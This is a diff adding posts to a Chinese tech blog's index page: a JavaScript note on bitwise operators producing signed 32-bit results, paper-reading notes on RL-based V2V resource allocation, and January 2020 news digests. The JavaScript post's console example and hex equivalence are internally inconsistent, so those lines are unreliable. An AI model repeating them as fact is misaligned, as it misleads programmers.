@@ -437,6 +437,1431 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/26817/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="治部少辅">
+      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
+      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="治部少辅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/posts/26817/" class="post-title-link" itemprop="url">Javascript中的整型问题</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-02-27 16:21:42 / Modified: 16:41:09" itemprop="dateCreated datePublished" datetime="2020-02-27T16:21:42+08:00">2020-02-27</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/编程研究/" itemprop="url" rel="index"><span itemprop="name">编程研究</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/posts/26817/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/26817/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>这两天在写 Electron 的时候发现了一个很诡异的错误。程序前两天测试的时候没有问题，今天突然不行了。检查代码发现错误原因是这样的：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf.writeUint32BE(now &amp; <span class="number">0xffffffff</span>, idx)</span><br></pre></td></tr></table></figure>
+<p>其中<code>buf</code>是一个<code>Buffer</code>对象，<code>now</code>是一个时间戳，为一个较大的整数。这行代码的目的是将时间戳的低 32 位写入 <code>buf</code>。不过，当<code>now</code>的第三十二位(自低向高)为 1 时，<code>now &amp; 0xffffffff</code>出来的会是负数，这样在<code>writeUint32BE</code>的检查中就会报错，因为这个函数不允许写入负数。</p>
+<p><code>now</code>的位数显然超过了 32 比特，如果在一些类型比较强的语言里面，应该会被视为一个64位整数。那么做位运算之后应该还是一个64位整数。上面这个错误说明在Js中，一个64位整型的数字在位运算之后得到的却是一个32位有符号数。是否是<code>0xffffffff</code>限制了输出的位数呢？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; a = <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">68719476735</span></span><br><span class="line">&gt; a &amp; <span class="number">0x00000000ffffffff</span></span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>0xffffffff 当做32位有符号数就是-1</p>
+</blockquote>
+<p>可见我们用64位的mask去做位运算得到的还是32位有符号数。</p>
+<p>这种乱象的根本原因是，js实际上是使用 <a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener">IEEE-754 浮点数</a>来表示所有的数字的，包括整型也是用浮点数来表示的。另外，在js中，位运算的输出总是被当做有符号32位数字<a href="https://stackoverflow.com/questions/15517646/how-are-32-bit-javascript-numbers-resulting-from-a-bit-wise-operation-converted" target="_blank" rel="noopener">source</a>。为了摒除这两个因素的影响，我们就无法用位运算来提取低32位的内容，而应该转而使用取余运算：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; a = <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">68719476735</span></span><br><span class="line">&gt; mask = <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line"><span class="number">4294967296</span></span><br><span class="line">&gt; lower_32_bits = a % mask</span><br><span class="line"><span class="number">4294967295</span></span><br></pre></td></tr></table></figure>
+<p>其中<code>4294967296 = 0x1000000000</code>, <code>4294967295=0xffffffff</code>。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/34309/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="治部少辅">
+      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
+      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="治部少辅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/posts/34309/" class="post-title-link" itemprop="url">读论文-增强学习与车联网通信资源分配</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-02-24 12:15:59 / Modified: 14:36:35" itemprop="dateCreated datePublished" datetime="2020-02-24T12:15:59+08:00">2020-02-24</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/读论文/" itemprop="url" rel="index"><span itemprop="name">读论文</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/posts/34309/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/34309/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>本次要读的论文是<a href="https://ieeexplore.ieee.org/document/8633948" target="_blank" rel="noopener">Deep Reinforcement Learning Based Resource Allocation for V2V Communications</a>，是 TVT 上的Popular Articles 中的第一篇。主要讲的内容是用增强学习（或者叫强化学习）来做 V2V 通信的资源分配。目前使用强化学习来做<strong>分布式</strong>的资源分配方案是一种比较流行的做法。使用强化学习做资源分配不要求决策者掌握全局信息。</p>
+<p>对于任何一个「资源分配」机制来说，首先要明确定义待分配的资源是何种形式，以及执行分配的主体为何。在文章的 Abstract 中提到，分配的资源是：</p>
+<blockquote>
+<p>An autonomous &quot;agent&quot;, a V2V link or a vehicle, make its decisions to find the optimal sub-band and power-level for transmission without requiring or having to wait for global information. ... . each agent can effectively learn to satisfy the stringent latency constraints on V2V links while minimizing the interference to vehicle-to-infrastructure communications.</p>
+</blockquote>
+<p>从上面的论述我们可以总结如下的信息：</p>
+<ol type="1">
+<li>执行资源分配的主体是一条通信链路或者一个通信节点</li>
+<li>待分配的资源的形式是Sub-band（可以理解为可用信道）和发射功率。发射功率直接与通信范围相关。调节通信范围是进行空分复用的一种方式</li>
+<li>资源分配的目标是满足延时要求，以及最小化 V2I 通信需求</li>
+<li>这里车间通信使用的是 5G D2D</li>
+</ol>
+<p>传统的资源分配方式一般是中心式的。这种分配方式要求从每个节点收集局部网络信息（链路状态和干扰信息）。在调度中心，资源分配问题被建模为一个优化问题，限制条件为V2V通信的QoS要求。不过这种优化问题一般是 NP 难问题。这种问题一般会用一些启发式算法来求局部最优解或者次优解。这类方法的首要问题是信息收集汇总的过程开销太大了，且随着网络规模的扩大会显著地增长。故这篇文章寻求使用分布式的分配方案。</p>
+<p>现存的一些分布式的资源分配方式的问题是他们考虑的一半是单播通信(Unicast)，而非广播过程。广播通信模式中的广播风暴也是资源分配机制需要考虑的问题。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/16684/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="治部少辅">
+      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
+      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="治部少辅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/posts/16684/" class="post-title-link" itemprop="url">Weekly-30</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-01-15 11:26:40" itemprop="dateCreated datePublished" datetime="2020-01-15T11:26:40+08:00">2020-01-15</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-02-27 19:37:00" itemprop="dateModified" datetime="2020-02-27T19:37:00+08:00">2020-02-27</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/posts/16684/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/16684/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="新闻">新闻</h2>
+<h3 id="中美签署贸易战第一阶段协议">中美签署贸易战第一阶段协议</h3>
+<p>这意味着近两年来拖累全球经济的贸易战暂告一个段落，而美国对大部分中国输美商品加征的关税则维持不变。周三在白宫签署所谓的第一阶段协议之前，漫长的美中经贸冲突曾引发全球市场焦虑，并给企业带来不确定性。</p>
+<p>协议全文 94 页（<a href="http://103.78.124.74:81/2Q2W191F46ABF384979D28B01DEDE17C6AF9E671666B_unknown_4F327C5A68A8BAAC21C97C814446427060F434D5_4/images.mofcom.gov.cn/www/202001/20200116104122611.pdf" target="_blank" rel="noopener">中</a>，<a href="https://assets.bwbx.io/documents/users/iqjWHBFdfxIU/rVaHxDBUtdew/v0" target="_blank" rel="noopener">英</a>），一些重点：</p>
+<ul>
+<li>前 16 页详细规定了保护知识产权的力度，对窃取商业机密行为作出刑事处罚。中国将在签署后 30 工作日内公布“增强知识产权保护的行动方案，以支持其高质量增长”。</li>
+<li>双方不得以市场准入相关门槛、合营并购等投资行为，强迫另外一方转让技术。</li>
+<li>2020-2021 年两年间，中国将从美国增加采购 2000 亿美元商品，包括 777 亿美元制造业商品、320 亿美元农产品、524 亿美元能源产品、379 亿美元服务业产品。增加是指在 2017 年贸易战爆发前基础上增加。</li>
+<li>双方互加关税没有消除。去年年底宣布达成协议时暂停增加的<a href="https://www.qdaily.com/articles/64246.html" target="_blank" rel="noopener">惩罚性关税</a>将继续暂停下去——-原定 12 月 15 日，美国对 1600 亿美元中国产手机、电脑、玩具等商品增加关税、中国对美国产汽车等商品增加关税。此外美国自 9 月 1 日起对 1200 亿中国商品加税幅度减半至 7.5%。但大部分已经执行的加税（美对中 2500 亿、中对美 1100 亿）没有取消。</li>
+</ul>
+<p>协议覆盖了一些已经在早先宣布的内容，比如双方遵循 G20 期间宣布的不以价格竞争为目的而贬值货币的承诺、中国对外开放银行、保险、资产管理等金融市场。</p>
+<p>特朗普现场称关税问题可以在第二阶段协议里一次性解决。刘鹤现场宣读中国国家主席习近平的信，敦促美国公平对待中国公司、保护双方大学等机构的持续合作。签约仪式和双方演讲有<a href="https://www.youtube.com/watch?v=3jA4rgUHgqA" target="_blank" rel="noopener">全程直播</a>。</p>
+<p>欧盟(EU)贸易专员菲尔•霍根(Phil Hogan)批评美中“第一阶段”贸易协议提供的经济利益有限，暗示这主要是唐纳德•特朗普(Donald Trump)为赢得连任而采取的政治行动 ... 此外，一些国家担心，作为协议的一部分，中国采购2000亿美元美国商品，将使世界两个最大经济体之间展开“管理贸易”，这可能会无视市场力量、对两国企业不利、违反世界贸易组织(WTO)的承诺。<a href="http://www.ftchinese.com/story/001085983" target="_blank" rel="noopener">source</a></p>
+<h3 id="中国经济数据">2019 中国经济数据</h3>
+<h3 id="俄罗斯政府宣布全体辞职"><a href="https://www.dw.com/zh/%E4%BF%84%E6%94%BF%E5%BA%9C%E5%AE%A3%E5%B8%83%E5%85%A8%E4%BD%93%E8%BE%9E%E8%81%8C/a-52013402" target="_blank" rel="noopener">俄罗斯政府宣布全体辞职</a></h3>
+<p>据俄罗斯通讯社报道，在普京总统发表年度国情咨文后，俄罗斯总理梅德韦杰夫宣布俄政府全体辞职。梅德韦杰夫表示，在俄罗斯总统普京宣布一系列宪法修改意见后，他告知普京，俄罗斯政府决定全体辞职。梅德韦杰夫说，普京总统的建议将对国家权力的平衡带来显著变化，政府以现在的形式辞职，以便总统可以采取所有必要措施。</p>
+<p>俄罗斯国际文传通讯社援引梅德韦杰夫报道，普京将提名新的政府，并指示现内阁在此之前继续留任。该通讯社还报道，普京将任命梅德韦杰夫为俄罗斯联邦安全会议副主席，负责国防和安全。</p>
+<p>1月15日早些时候，普京在国情咨文讲话中宣布，将在宪法改革中赋予议会更大的权力。议会今后将决定政府首脑以及重要的内阁成员。</p>
+<blockquote>
+<p>李建秋在之前的一篇文章里面就提到了梅德韦杰夫的问题。梅德韦杰夫作为自由派，在很多问题上优柔寡断，损害了俄罗斯的利益，下台是必然的。</p>
+</blockquote>
+<p>克里姆林宫表示，俄罗斯总统普京周三正式提名名不见经传的俄罗斯联邦税务局局长Mikhail Mishustin担任新总理。<a href="https://cn.reuters.com/article/russia-putin-mishustin-new-pm-0115-idCNKBS1ZE30K?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></p>
+<h3 id="美军多人在伊朗导弹袭击中受伤">美军多人在伊朗导弹袭击中受伤</h3>
+<p>1 月 8 日，伊朗为报复美国无人机袭击炸死圣城旅最高领导人苏莱曼尼准将，向美军在伊拉克的若干军事基地发动了导弹袭击。随后美国总统特朗普表示伊朗的导弹袭击没有导致任何美国人的伤亡，中东局势随之降温。不过近日新的消息显示，大约有 11 名美国士兵在伊朗的导弹袭击中受伤。<a href="https://www.reuters.com/article/us-iraq-security-usa-casualties/eleven-u-s-troops-injured-in-jan-8-iran-missile-attack-in-iraq-idUSKBN1ZG0AX" target="_blank" rel="noopener">source</a></p>
+<h3 id="其他">其他</h3>
+<h4 id="国内">国内</h4>
+<ul>
+<li>武汉发现的新型冠状病毒有人传人的风险，已向全球医院发出警告。<a href="https://cn.reuters.com/article/china-health-concern-who-0114-tues-idCNKBS1ZE01J?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li>
+<li>2019 年中国汽车的销量下降了 8.2%，至 2580 万辆。<a href="http://www.ftchinese.com/story/001085908" target="_blank" rel="noopener">source</a></li>
+<li>中国海关总署发布数据，2019年，中美两国贸易额为5412.23亿美元，同比下降14.6%。<a href="http://sputniknews.cn/economics/202001141030443429/" target="_blank" rel="noopener">source</a></li>
+<li>1 月 16 日，著名主持人赵忠祥去世。<a href="https://www.zhihu.com/question/366508914" target="_blank" rel="noopener">source</a></li>
+<li>1 月 16 日，首家纯外资保险公司 安联中国在上海正式开业。</li>
+<li>支持反送中的香港民间组织「国难中医」创建人被指在广州嫖娼被捕。这位化名”肥仔“的香港学生就读于广州中医药大学，“国难忠医”为一个志愿医务人员网。<a href="https://www.dw.com/zh/香港-国难忠医-创建人被指在广州嫖娼被捕/a-52031133?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li>
+<li>大陆总人口突破 14 亿人。国家统计局数据显示，截至2019年末，中国大陆总人口突破14亿人，为140005万人，比上年末增长467万人。</li>
+<li>国家统计局 1 月 17 日对外宣布，经过初步核算，2019 年我国国内生产总值 (GDP) 为 99.0865万亿元，稳居世界第二位；人均GDP首次站上1万美元的新台阶。此前，全球人均GDP超过1万美元的经济体总人口近15亿。中国人均GDP突破1万美元，相当于人均GDP超过1万美元的世界人口翻了一番。</li>
+<li>一名女子在社交媒体上晒出了自己驾驶豪华越野车进入紫禁城的照片，在中国引发轩然大波。故宫博物院周五（1月17日）连夜致歉。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-51159468" target="_blank" rel="noopener">source</a>, <a href="https://zh.wikipedia.org/wiki/%E5%A5%B3%E5%AD%90%E5%BC%80%E8%BD%A6%E8%BF%9B%E6%95%85%E5%AE%AB%E4%BA%8B%E4%BB%B6" target="_blank" rel="noopener">source: Wiki</a>,</li>
+</ul>
+<h4 id="国际">国际</h4>
+<ul>
+<li>乌克兰客机遇害者所属国家将在伦敦开会讨论对伊朗此案去法律行动。<a href="https://cn.reuters.com/article/iran-crash-ukraine-exclusive-0113-mon-idCNKBS1ZD015?feedType=RSS&amp;feedName=CNTopGenNews" target="_blank" rel="noopener">source</a></li>
+<li>本周中美将签订贸易协议，在签订之前，美国财务部将摘掉中国汇率操纵国的标签。特朗普政府的一位官员暗示美方将采取上述行动。此举将逆转去年夏天美国政府将中国列为汇率操纵国的有争议决定；当时华盛顿和北京之间的紧张关系急剧升级。<a href="http://www.ftchinese.com/story/001085909" target="_blank" rel="noopener">source</a></li>
+<li>位于拉合尔的巴基斯坦最高法院裁定审理前总统<a href="https://zh.wikipedia.org/zh-hans/%E4%BD%A9%E5%B0%94%E9%9F%A6%E5%85%B9%C2%B7%E7%A9%86%E6%B2%99%E6%8B%89%E5%A4%AB" target="_blank" rel="noopener">穆沙拉夫</a>的特别法院违宪，后者被判处死刑。<a href="http://sputniknews.cn/politics/202001141030442655/" target="_blank" rel="noopener">source</a></li>
+<li>英国首相鲍里斯·约翰逊14日明确拒绝苏格兰要求于今年举行二次独立公投的要求，称二次公投会让苏格兰再度陷入政治僵局。<a href="http://www.bjd.com.cn/a/202001/15/WS5e1e8937e4b0e6e583938c98.html" target="_blank" rel="noopener">source</a></li>
+<li>在武汉发现的不明肺炎在泰国曼谷发现首例境外感染者。<a href="http://www.bbc.com/zhongwen/simp/world-51116985" target="_blank" rel="noopener">source</a></li>
+<li>日本厚生劳动省对外通报，日本国内发现首例感染新型病毒的肺炎患者病例。患者是一位居住在日本、此前曾前往过武汉的中国籍男子。<a href="https://www.dw.com/zh/日本现首例新型冠状病毒肺炎/a-52020515?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source</a></li>
+<li>丹麦地标小美人鱼像被喷上 Free Hong Kong 的口号。该雕像过往曾多次被涂鸦及损毁，更在1964年及1998年两次被“斩首”。<a href="http://www.bbc.com/zhongwen/simp/world-51116225" target="_blank" rel="noopener">source</a></li>
+<li>据俄罗斯卫星网1月16日报道，车臣总统和政府网站上发布的命令称，车臣领导人拉姆赞·卡德罗夫13日签署文件任命车臣政府总理穆斯利姆·胡奇耶夫自1月13日起在他暂时丧失工作能力期间临时行使领导人职权。</li>
+<li>美国要求台积电在大选前做好决定，是否前往美国生产芯片。</li>
+<li>土耳其总统埃尔多安当地时间16日宣布，将开始向利比亚部署军队以支持“民族团结政府”并维护地区稳定。《卫报》援引消息人士称，土耳其已经或即将向利比亚派出2000名来自叙利亚的反政府武装分子，但这一说法未获证实。<a href="https://www.guancha.cn/internation/2020_01_17_531922.shtml" target="_blank" rel="noopener">source</a></li>
+<li>土耳其解除对维基百科的屏蔽。在近一千天后，在宪法法院裁决屏蔽违法之后，土耳其解除了对维基百科的封锁。因为拒绝删除批评政府的文章，土耳其在 2017 年 4 月命令 ISP 屏蔽了维基百科。这一封锁共持续了 991 天。维基基金会对解除封锁表达了欢迎。对维基百科的解封不是一下子实现的，而是“逐步”，部分 ISP 还在处理之中。<a href="https://t.me/solidot/9931" target="_blank" rel="noopener">source: Solidot</a></li>
+<li>习近平出访缅甸，这是中国最高领导人19年来首次访问缅甸。其中一项重要目标，便是推进中国在印度洋的门户皎漂港的项目。<a href="http://www.bbc.com/zhongwen/simp/chinese-news-51146741" target="_blank" rel="noopener">source: BBC</a>, <a href="https://www.dw.com/zh/习近平抵达缅甸：官方热烈欢迎-民间担忧加剧/a-52044385?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source2: DW</a></li>
+<li>英国宣布 31 日的脱欧大庆计划，其中包括上演灯光秀和发行纪念币。。<a href="https://www.dw.com/zh/英国宣布脱欧大庆计划/a-52053130?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source: DW</a></li>
+<li>默克尔表示，德国这样的开放国家，不应将华为这样的个别公司拒之门外，而且没有华为，德国5G网络建设也会受到威胁。如今，联邦内政部长也做出了类似的表态。<a href="https://www.dw.com/zh/德内政部长力挺华为参与德国5g扩建/a-52051010?maca=chi-rss-chi-all-1127-rdf" target="_blank" rel="noopener">source: DW</a></li>
+</ul>
+<h4 id="科技">科技</h4>
+<ul>
+<li>Google 将淘汰第三方Cookie。<a href="http://www.ftchinese.com/story/001085945" target="_blank" rel="noopener">source</a></li>
+<li>微软正式终止支持 Windows 7。<a href="https://www.williamlong.info/archives/5949.html" target="_blank" rel="noopener">source</a></li>
+<li>微软正式发布基于 Chromium 的浏览器 the New Microsoft Edge。拥有更快的速度、更低的内存占用，更多的隐私选项，支持 Windows 7、8、8.1、10 和 macOS，支持全部现有的 Chrome 扩展。<a href="https://www.appinn.com/the-new-microsoft-edge-base-chromium/" target="_blank" rel="noopener">source</a></li>
+<li>Sony 计划向 PC 移植其独占游戏作品。<a href="https://t.me/solidot/9937" target="_blank" rel="noopener">source: Solidot</a></li>
+<li>Google 的母公司 Alphabet 股票市场首次突破 1 万亿美元，成为第四家跨越这一门槛的美国科技企业。<a href="http://www.ftchinese.com/story/001085991" target="_blank" rel="noopener">source: FT</a></li>
+<li>中科院计算所团队推出“完全自主设计、开发和实现”的“木兰”编程语言，很多开发者发现解包后的木兰语言其实就是建立在 Python 之上，将 Python 构建的环境、包和项目都编译成一个可执行文件。似乎木兰只是在顶层做了一个接口，将底层编译、优化等众多工作都交给了原版 Python。“木兰”编程语言是Python语言的套壳产品。<a href="https://www.williamlong.info/archives/5952.html" target="_blank" rel="noopener">source</a>。</li>
+</ul>
+<h2 id="言论">言论</h2>
+<ul>
+<li>如果还没想清楚，就用蛮力算法。 —— Ken Thompson</li>
+<li>不要使用反正弦和反余弦函数——你总能用优美的恒等式，或者是计算向量点积来更好地解决问题。—— Jim Conyngha</li>
+<li>在存储日期中的年份的时候，请使用四位数字。—— David Martin</li>
+<li>避免使用不对称结构。—— Andy Huber</li>
+<li>代码写的越急，程序跑得越慢。—— Roy Carlson</li>
+<li>你用英语都写不出来的东西就别指望用代码写了。—— Peter Halpern</li>
+<li>如果代码和注释不一致，那很可能两者都错了。—— Norm Schryer</li>
+<li>如果你发现特殊情况太多，那你肯定是用错方法了。—— Carig Zerouni</li>
+<li><p>先把数据结构搞清楚，程序的其余部分自现。—— David Jones</p></li>
+<li><p>I don't care who does the electing, so long as I get to do the nominating. - <a href="https://en.wikiquote.org/wiki/William_M._Tweed" target="_blank" rel="noopener">William M. Tweed</a></p></li>
+</ul>
+<h2 id="文章">文章</h2>
+<ul>
+<li><a href="https://www.bbc.com/future/article/20170607-why-printers-add-secret-tracking-dots" target="_blank" rel="noopener">Why printers add secret tracking dots</a>。彩色打印机厂商会在页面上添加隐形标志，但是从不对外界透露。</li>
+<li><a href="https://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api" target="_blank" rel="noopener">RESTful API 最佳实践</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/55277/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="治部少辅">
+      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
+      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="治部少辅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/posts/55277/" class="post-title-link" itemprop="url">Weekly-29</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-01-07 12:33:09" itemprop="dateCreated datePublished" datetime="2020-01-07T12:33:09+08:00">2020-01-07</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-01-22 13:23:13" itemprop="dateModified" datetime="2020-01-22T13:23:13+08:00">2020-01-22</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/posts/55277/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/55277/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
